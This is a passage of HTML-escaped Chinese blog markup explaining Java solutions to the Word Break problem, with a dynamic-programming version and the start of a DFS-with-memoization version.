初始状态定义为dp[0] = true，意味着存在没有使用任何单词的情况&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;优化&#34;&gt;优化&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;迭代过程中，如果发现dp[i] == true ，直接break，其中在时间上通过限制内层循环的长度和提前退出循环增加了一些效率&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;代码&#34;&gt;代码&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Solution&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;wordBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maxw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maxw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maxw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maxw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;时间复杂度O(n)&lt;/p&gt;
&lt;p&gt;空间复杂度O(n)&lt;/p&gt;
&lt;h4 id=&#34;dfs记忆化&#34;&gt;DFS+记忆化&lt;/h4&gt;
&lt;p&gt;通过上面timeout的示例，我们可以看到做了大量重复计算&lt;/p&gt;
&lt;h5 id=&#34;优化-1&#34;&gt;优化&lt;/h5&gt;
&lt;p&gt;创建一个HashMap &#39;memo&#39; 用来存储已经解决的子问题结果，用start作为指针代表当前节点的状态，从start位置开始，尝试每一个i，如果字串s(start,i)在字典中，并且剩余的字符串可以成功分割则返回true，如果start的结果已经在memo中，直接返回结果即可，当start等于字符串长度，表示成功到达字符串末尾&lt;/p&gt;
&lt;h5 id=&#34;代码-1&#34;&gt;代码&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Solution&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;canBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Boolean&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
